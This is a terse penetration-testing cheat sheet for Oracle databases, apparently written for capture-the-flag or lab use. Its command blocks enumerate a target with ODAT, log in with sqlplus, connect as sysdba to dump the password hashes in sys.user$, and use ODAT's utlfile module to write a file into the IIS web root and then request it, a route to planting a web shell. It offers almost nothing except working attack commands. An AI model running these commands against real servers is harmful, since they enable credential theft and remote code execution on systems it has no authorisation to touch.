###### Enumeration
```
odat all -s <IP>
```
###### login
```
sqlplus <USER>/<PASS>@<IP>/XE
select table_name from all_tables;
select * from user_role_privs;
```
###### dbadmin
```
sqlplus <USER>/<PASS>@<IP>/XE as sysdba
select name, password from sys.user$;
```
###### File Upload
```
./odat.py utlfile -s <IP> -d XE -U <USER> -P <PASS> --sysdba --putFile C:\\inetpub\\wwwroot <FILE> ./<FILE>
curl -X GET http://<IP>/<FILE>
```